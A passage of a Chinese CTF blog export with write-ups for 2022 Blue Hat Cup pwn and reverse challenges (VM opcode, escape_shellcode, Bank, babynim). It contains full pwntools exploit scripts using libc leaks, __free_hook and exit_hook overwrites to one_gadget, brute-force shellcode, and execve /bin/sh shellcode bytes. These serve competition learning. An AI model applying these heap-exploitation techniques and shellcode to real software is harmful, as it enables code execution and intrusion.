class="keyword">def</span> <span class="title function_">opcode</span>(<span class="params">code, dest, arg1, arg2</span>):</span><br><span class="line">    pld = code &lt;&lt; <span class="number">24</span></span><br><span class="line">    pld += dest &lt;&lt; <span class="number">16</span></span><br><span class="line">    pld += arg1 &lt;&lt; <span class="number">8</span></span><br><span class="line">    pld += arg2</span><br><span class="line">    sl(<span class="built_in">str</span>(pld))</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&#x27;first,tell me your name.&#x27;</span>, <span class="string">b&#x27;%20$p&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;welcome:&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(r(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">231</span> - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">ogg = libc_base + <span class="number">0x4f302</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;How many pieces of data?&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">s(p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(free_hook))</span><br><span class="line">s(p64(ogg))</span><br><span class="line">sla(<span class="string">&#x27;Size:&#x27;</span>, <span class="string">b&#x27;8&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++]&#x27;</span>)</span><br><span class="line"></span><br><span class="line">opcode(<span class="number">0xa</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)    <span class="comment"># 0</span></span><br><span class="line">opcode(<span class="number">0xa</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>)    <span class="comment"># 1</span></span><br><span class="line">opcode(<span class="number">0xc</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">opcode(<span class="number">0xb</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)    <span class="comment"># fd -&gt; __free_hook</span></span><br><span class="line">opcode(<span class="number">0xa</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>)    <span class="comment"># 1</span></span><br><span class="line">opcode(<span class="number">0xa</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>)    <span class="comment"># 2 __free_hook</span></span><br><span class="line">opcode(<span class="number">0xb</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>)    <span class="comment"># __free_hook -&gt; one_gadget</span></span><br><span class="line">opcode(<span class="number">0xc</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Vm</tag>
      </tags>
  </entry>
  <entry>
    <title>2022 蓝帽杯</title>
    <url>/2022/09/25/CTF/2022%E8%93%9D%E5%B8%BD%E6%9D%AF/</url>
    <content><![CDATA[<h2 id="初赛"><a href="#初赛" class="headerlink" title="初赛"></a>初赛</h2><h3 id="escape-shellcode"><a href="#escape-shellcode" class="headerlink" title="escape_shellcode"></a>escape_shellcode</h3><p>一道开启沙盒的shellcode题目，只允许我们用read和write，恶心的是居然把除了rip寄存器之外的所有寄存器都给覆盖成垃圾数据，导致我们不能泄露地址，也不能使用栈结构，最多能搜刮是rip里面存储的堆地址。所以我们采取爆破的方式来找flag，我们flag的低位保持0x120不变，所以只要往高位爆破就好。</p>
<p>注意几点：一个是我们会发现每次rip中的地址和堆起始地址的偏移不一样，所以要用位运算来解决，不能用sub汇编来解决求取堆起始地址的问题；第二是我们不能在汇编之外进行循环，要在汇编里面完成循环，否则地址随机化会导致爆破不成功；第三是注意rip不可访问的问题。</p>
<span id="more"></span>

<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./escape_shellcode&quot;</span>)</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pld = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">lea r13, [rip]</span></span><br><span class="line"><span class="string">mov r11, 0xfffffffff000</span></span><br><span class="line"><span class="string">and r13, r11				// 求得堆地址</span></span><br><span class="line"><span class="string">add r13, 0x120				// 使低位为0x120</span></span><br><span class="line"><span class="string">mov r10, r13</span></span><br><span class="line"><span class="string">mov r14, 0					// r14是每次起始地址减去的长度</span></span><br><span class="line"><span class="string">mov r15, 0x10000			// r15是循环的次数</span></span><br><span class="line"><span class="string">loop :</span></span><br><span class="line"><span class="string">mov r13, r10</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rdx, 0x30</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">sub r15, 1</span></span><br><span class="line"><span class="string">add r14, 0x1000				// 进行0x1000大小的递增</span></span><br><span class="line"><span class="string">sub r13, r14</span></span><br><span class="line"><span class="string">mov rsi, r13</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">cmp r15, 0</span></span><br><span class="line"><span class="string">ja loop						// r15大于0的时候进行跳转</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pld = asm(pld)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">sh.send(pld)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>只要爆破1秒就能出flag。</p>
<p>其他方法：如果给了libc版本，可以通过释放堆的fd泄露libc，通过libc里面的environ泄露栈，通过栈可以泄露代码段的地址，也就能得到flag的地址。</p>
<h3 id="Bank"><a href="#Bank" class="headerlink" title="Bank"></a>Bank</h3><p>类似于银行ATM取款机的一道题目，主要的难点在代码审计，libc版本是2.31，发现漏洞主要存在于Transfer这一个功能中，我们开始可以利用的钱是0x190(有个强制类型转换)，也就是400块，Transfer中的主要实现如下：</p>
<blockquote>
<p>注意在Transfer中可以进行刷钱，只要我们输入的金额和我们现有的金额相同就好，比赛时候就是没想通这一点，没钱💴用是真的难受😫！！！这道题就叫：用多少取多少😁</p>
</blockquote>
<ul>
<li>admin：花大于30块钱，可以得到一个泄露地址的机会</li>
<li>hacker：花大于50块钱，可以得到一个释放随机地址堆块的机会</li>
<li>guest：花大于5块钱，可以<code>malloc(0x18)</code>，然后写入0x10字节大小的数据</li>
<li>ghost：花大于10块钱，realloc一个大小小于等于0x100的堆块</li>
<li>abyss：无需花钱，进行任意地址写，然后<code>exit(0)</code></li>
</ul>
<p>所以我们准备打<code>exit_hook</code>，泄露libc然后找到<code>_rtld_global</code>结构体，覆盖<code>__rtld_lock_unlock_recursive</code>或者<code>_rtld_lock_lock_recursive</code>为onegadget。</p>
<p>exit函数调用流程：<code>exit()-&gt;__run_exit_handlers-&gt;_dl_fini-&gt;__rtld_lock_unlock_recursive or _rtld_lock_lock_recursive</code></p>
<blockquote>
<p>参考文章：<a href="https://blog.csdn.net/qq_43116977/article/details/105485947">(9条消息) exit_hook劫持_starssgo的博客-CSDN博客</a></p>
</blockquote>
<p>介绍一下realloc函数的用法，之前没遇到过：</p>
<p><code>void *realloc(void *ptr, size_t size)</code>：其中ptr是指向一个要重新分配的堆块，如果ptr为空，那么会分配一个新的内存块，并且函数返回一个指向它的指针；size是新的内存块的大小，如果为0并且ptr指向一个已经存在的堆块，那么ptr指向的内存块会被释放，并且返回一个空指针。需要注意的是，如果申请的大小大于原来堆块的大小，realloc会将之前的chunk释放掉，再去处理我们请求的堆块；如果申请的大小小于堆块的大小，realloc会对原有的chunk进行切分，将多余的给释放掉。在这道题目中，可以通过<strong>先realloc一个大的再realloc一个小的</strong>达到效果。</p>
<p>WP如下：</p>
<blockquote>
<p>用的不是题目给的libc-2.31，用的是本机的libc-2.31，所以偏移可能有差别</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./Bank&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./Bank&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">slibc</span>(<span class="params">leak_name, leak_addr, flag = <span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> :</span><br><span class="line">        libc_base = leak_addr - libc.symbols[<span class="built_in">str</span>(leak_name)]</span><br><span class="line">        sys_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        bin_sh = libc_base + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        libcsch = LibcSearcher(<span class="built_in">str</span>(leak_name), leak_addr)</span><br><span class="line">        libc_base = leak_addr - libcsch.dump(<span class="built_in">str</span>(leak_name))</span><br><span class="line">        sys_addr = libc_base + libcsch.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">        bin_sh = libc_base + libcsch.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [sys_addr, bin_sh]</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Login</span>(<span class="params">card_number, password</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Click: &#x27;</span>, <span class="string">b&#x27;Login&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Card Numbers: &#x27;</span>, <span class="built_in">str</span>(card_number))</span><br><span class="line">    sla(<span class="string">b&#x27;Password: &#x27;</span>, <span class="built_in">str</span>(password))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Info</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Click: &#x27;</span>, <span class="string">b&#x27;Info&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Deposit</span>(<span class="params">money</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Click: &#x27;</span>, <span class="string">b&#x27;Deposit&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;How Much? &#x27;</span>, <span class="built_in">str</span>(money))   </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Transfer</span>(<span class="params">money, name</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Click: &#x27;</span>, <span class="string">b&#x27;Transfer&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;who? &#x27;</span>, name)</span><br><span class="line">    sla(<span class="string">b&#x27;How much? &#x27;</span>, <span class="built_in">str</span>(money))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Put</span>(<span class="params">money</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Click: &#x27;</span>, <span class="string">b&#x27;Put&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;How Much? &#x27;</span>, <span class="built_in">str</span>(money))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">money</span>):           <span class="comment"># 30</span></span><br><span class="line">    Transfer(money, <span class="string">b&#x27;admin&#x27;</span>)    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hacker</span>(<span class="params">money, ptr</span>):     <span class="comment"># 50</span></span><br><span class="line">    Transfer(money, <span class="string">b&#x27;hacker&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;hacker: Great!&#x27;</span>, <span class="built_in">str</span>(ptr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guest</span>(<span class="params">money, context</span>):  <span class="comment"># 5</span></span><br><span class="line">    Transfer(money, <span class="string">b&#x27;guest&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;data: &#x27;</span>, context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ghost</span>(<span class="params">money, size</span>):     <span class="comment"># 10</span></span><br><span class="line">    Transfer(money, <span class="string">b&#x27;ghost&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;ghost: &amp;^%$#@!   :)&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">abyss</span>(<span class="params">money, addr</span>):</span><br><span class="line">    Transfer(money, <span class="string">b&#x27;abyss&#x27;</span>)</span><br><span class="line">    <span class="comment"># dbg()</span></span><br><span class="line">    sl(<span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line">Login(<span class="number">11</span>, <span class="number">11111111</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap</span></span><br><span class="line">Put(<span class="number">11</span>)</span><br><span class="line">ghost(<span class="number">11</span>, <span class="number">0x100</span>)</span><br><span class="line">ghost(<span class="number">11</span>, <span class="number">0x28</span>)      <span class="comment"># use realloc to free</span></span><br><span class="line">ghost(<span class="number">11</span>, <span class="number">0x100</span>)</span><br><span class="line">ghost(<span class="number">11</span>, <span class="number">0x28</span>)      <span class="comment"># use realloc to free</span></span><br><span class="line">Put(<span class="number">33</span>)       <span class="comment"># 44 - 11 = 33</span></span><br><span class="line">admin(<span class="number">44</span>)</span><br><span class="line">ru(<span class="string">&#x27;I think &#x27;</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(r(<span class="number">14</span>), <span class="number">16</span>) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">lg(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br><span class="line">ptr_init = heap_addr + <span class="number">0x2a0</span></span><br><span class="line">lg(<span class="string">&#x27;ptr_init&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line"><span class="comment"># tcache_max = 0x410</span></span><br><span class="line"><span class="comment"># make fake_chunk(size &gt; 0x410)</span></span><br><span class="line">free_ptr = heap_addr + <span class="number">0x4e0</span> + <span class="number">0x10</span>     <span class="comment"># 0x420</span></span><br><span class="line">lg(<span class="string">&#x27;free_ptr&#x27;</span>)</span><br><span class="line">guest(<span class="number">44</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>))      <span class="comment"># fake_head</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    guest(<span class="number">44</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">guest(<span class="number">44</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line">guest(<span class="number">44</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line">Put(<span class="number">7</span>)       <span class="comment"># 51 - 44 = 7</span></span><br><span class="line">hacker(<span class="number">51</span>, free_ptr)</span><br><span class="line">Put(<span class="number">23</span>)       <span class="comment"># 74 - 51 = 23</span></span><br><span class="line">admin(<span class="number">74</span>)</span><br><span class="line">ru(<span class="string">&#x27;I think &#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(r(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">0x1ecbe0</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rtld = libc_base + <span class="number">0x22e060</span></span><br><span class="line">lg(<span class="string">&#x27;rtld&#x27;</span>)</span><br><span class="line">hook = rtld + <span class="number">0xf08</span></span><br><span class="line">lg(<span class="string">&#x27;hook&#x27;</span>)</span><br><span class="line">onegadget = libc_base + <span class="number">0xe3afe</span></span><br><span class="line">lg(<span class="string">&#x27;onegadget&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># change hook-&gt;onegadget</span></span><br><span class="line">hacker(<span class="number">74</span>, ptr_init)</span><br><span class="line">guest(<span class="number">74</span>, p64(hook) * <span class="number">2</span>)</span><br><span class="line">abyss(<span class="number">74</span>, onegadget)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="半决赛"><a href="#半决赛" class="headerlink" title="半决赛"></a>半决赛</h2><h3 id="babynim"><a href="#babynim" class="headerlink" title="babynim"></a>babynim</h3><p>我是首先看了一下字符串表和引用，发现如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TM__xLHv575t3PG1lB5wK05Xqg_16：&#x27;51748409119571493927314047697799213641286278894049840228804594223988372501782894889443165173295123444031074892600769905627166718788675801&#x27;</span><br><span class="line">TM__xLHv575t3PG1lB5wK05Xqg_12：&#x27;56006392793428440965060594343955737638876552919041519193476344215226028549209672868995436445345986471&#x27;</span><br><span class="line"></span><br><span class="line">TM__xLHv575t3PG1lB5wK05Xqg_19 -&gt; TM__xLHv575t3PG1lB5wK05Xqg_20 -&gt; &#x27;error&#x27;</span><br><span class="line">TM__xLHv575t3PG1lB5wK05Xqg_17 -&gt; TM__xLHv575t3PG1lB5wK05Xqg_18 -&gt; &#x27;win&#x27;</span><br></pre></td></tr></table></figure>

<p>通过符号表找到主函数，一路追加找到关键函数<code>NimMainModule()</code>，一下是一些关键代码（做了一点注释）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取我们的输入</span></span><br><span class="line">	Line__systemZio_364 = (_QWORD *)readLine__systemZio_364(v0);</span><br><span class="line">	we_ipt = Line__systemZio_36</span><br><span class="line"></span><br><span class="line"><span class="comment">// 确定输入字符串的长度为42</span></span><br><span class="line">    input__hello_2 = (__int64)Line__systemZio_364;</span><br><span class="line">    <span class="keyword">if</span> ( *Line__systemZio_364 != <span class="number">42</span>i64 )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_5:</span><br><span class="line">      v5 = check__hello_3;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 确定flag的格式</span></span><br><span class="line">  <span class="keyword">if</span> ( flag-&gt;m128i_i64[<span class="number">0</span>] != <span class="string">&#x27;\x05&#x27;</span> || flag[<span class="number">1</span>].m128i_i32[<span class="number">0</span>] != <span class="string">&#x27;galf&#x27;</span> || flag[<span class="number">1</span>].m128i_i8[<span class="number">4</span>] != <span class="string">&#x27;&#123;&#x27;</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  v9 = (<span class="type">unsigned</span> __int64 *)input__hello_2;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对输入的数据进行处理，取中间的36位</span></span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(input__hello_2 + <span class="number">57</span>) == <span class="string">&#x27;&#125;&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = <span class="number">0</span>i64;</span><br><span class="line">    v12 = mnewString(<span class="number">36</span>i64);</span><br><span class="line">    <span class="keyword">if</span> ( !v12 )</span><br><span class="line">      raiseIndexError2(<span class="number">0</span>i64, <span class="number">-1</span>i64);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v12-&gt;m128i_i64[<span class="number">0</span>] &lt;= (<span class="type">unsigned</span> __int64)v11 )</span><br><span class="line">        raiseIndexError2(v11, v12-&gt;m128i_i64[<span class="number">0</span>] - <span class="number">1</span>);</span><br><span class="line">      v13 = v11 + <span class="number">5</span>;	<span class="comment">// 屏蔽开始的&#x27;flag&#123;&#x27;</span></span><br><span class="line">      <span class="keyword">if</span> ( v11 + <span class="number">5</span> &lt; <span class="number">0</span> || v13 &lt; v11 )</span><br><span class="line">        raiseOverflow();</span><br><span class="line">      <span class="keyword">if</span> ( *v9 &lt;= v13 )</span><br><span class="line">        raiseIndexError2(v11 + <span class="number">5</span>, *v9 - <span class="number">1</span>);</span><br><span class="line">      v12[<span class="number">1</span>].m128i_i8[v11++] = *((_BYTE *)v9 + v13 + <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v11 &lt;= <span class="number">35</span> );</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对我们输入的数字和TM__xLHv575t3PG1lB5wK05Xqg_12指向的数字进行相乘</span></span><br><span class="line">	<span class="comment">// 将v12载入x__hello_40</span></span><br><span class="line">	initBigInt__6758Z85sersZ65ZOnimbleZpkgsZbigints4548O53O48Zbigints_1987((__int64)v12, <span class="number">10</span>i64, &amp;x__hello_40);</span><br><span class="line">    <span class="comment">// 将TM__xLHv575t3PG1lB5wK05Xqg_12载入a__hello_41</span></span><br><span class="line">	initBigInt__6758Z85sersZ65ZOnimbleZpkgsZbigints4548O53O48Zbigints_1987(</span><br><span class="line">      (__int64)&amp;TM__xLHv575t3PG1lB5wK05Xqg_12,</span><br><span class="line">      <span class="number">10</span>i64,</span><br><span class="line">      &amp;a__hello_41);</span><br><span class="line">    v21 = <span class="number">0</span>i64;</span><br><span class="line">    v22 = <span class="number">0</span>i64;</span><br><span class="line">    v20 = _mm_loadu_si128((<span class="type">const</span> __m128i *)&amp;x__hello_40);	<span class="comment">// 将x__hello_40载入v20</span></span><br><span class="line">    v19 = _mm_loadu_si128((<span class="type">const</span> __m128i *)&amp;a__hello_41);	<span class="comment">// 将a__hello_41载入v19</span></span><br><span class="line">    star___6758Z85sersZ65ZOnimbleZpkgsZbigints4548O53O48Zbigints_1219(&amp;v20, &amp;v19, &amp;v21);</span><br><span class="line">	v14 = v21;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 进入star___6758Z85sersZ65ZOnimbleZpkgsZbigints4548O53O48Zbigints_1219函数，发现是相乘的操作</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+48h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  genericSeqAssign(</span><br><span class="line">    (<span class="type">char</span> *)&amp;v5,</span><br><span class="line">    (__int64)&amp;TM__7msO9agWKbXtldQioKYEG4w_61,</span><br><span class="line">    (__int64)&amp;NTIseqLuint5150T__9bAGqSvkAaFL9bWjsEPslrFA_);</span><br><span class="line">  genericSeqAssign(a3, v5, (__int64)&amp;NTIseqLuint5150T__9bAGqSvkAaFL9bWjsEPslrFA_);</span><br><span class="line">  a3[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> multiplication__6758Z85sersZ65ZOnimbleZpkgsZbigints4548O53O48Zbigints_1010(a3);	<span class="comment">// multiplication</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 比较相乘后的数字与TM__xLHv575t3PG1lB5wK05Xqg_17指向的数字是否相同</span></span><br><span class="line">	<span class="comment">// 将v14载入result__hello_43</span></span><br><span class="line">	genericSeqAssign((<span class="type">char</span> *)&amp;result__hello_43, v14, (__int64)refptr_NTIseqLuint5150T__9bAGqSvkAaFL9bWjsEPslrFA_);</span><br><span class="line">    BYTE8(result__hello_43) = byte_42C188;</span><br><span class="line">    initBigInt__6758Z85sersZ65ZOnimbleZpkgsZbigints4548O53O48Zbigints_1987(</span><br><span class="line">      (__int64)&amp;TM__xLHv575t3PG1lB5wK05Xqg_16,</span><br><span class="line">      <span class="number">10</span>i64,</span><br><span class="line">      &amp;res__hello_44);</span><br><span class="line">    v20 = _mm_loadu_si128((<span class="type">const</span> __m128i *)&amp;result__hello_43);	<span class="comment">// 将result__hello_43载入v20</span></span><br><span class="line">    v19 = _mm_loadu_si128((<span class="type">const</span> __m128i *)&amp;res__hello_44);		<span class="comment">// 将res__hello_44载入v19</span></span><br><span class="line">    <span class="keyword">if</span> ( eqeq___6758Z85sersZ65ZOnimbleZpkgsZbigints4548O53O48Zbigints_259(&amp;v20, &amp;v19) )	<span class="comment">// 比较v20和v19的值是否相同</span></span><br><span class="line">    &#123;</span><br><span class="line">      check__hello_3 = <span class="number">1</span>i64;</span><br><span class="line">      <span class="keyword">return</span> echoBinSafe((__int64)&amp;TM__xLHv575t3PG1lB5wK05Xqg_17, <span class="string">&#x27;\x01&#x27;</span>);	<span class="comment">// win</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_6:</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> echoBinSafe((__int64)&amp;TM__xLHv575t3PG1lB5wK05Xqg_19, <span class="string">&#x27;\x01&#x27;</span>);	<span class="comment">// error</span></span><br><span class="line">  <span class="keyword">return</span> echoBinSafe((__int64)&amp;TM__xLHv575t3PG1lB5wK05Xqg_17, <span class="string">&#x27;\x01&#x27;</span>);	<span class="comment">// win</span></span><br></pre></td></tr></table></figure>

<p>所以实际上的操作就是：</p>
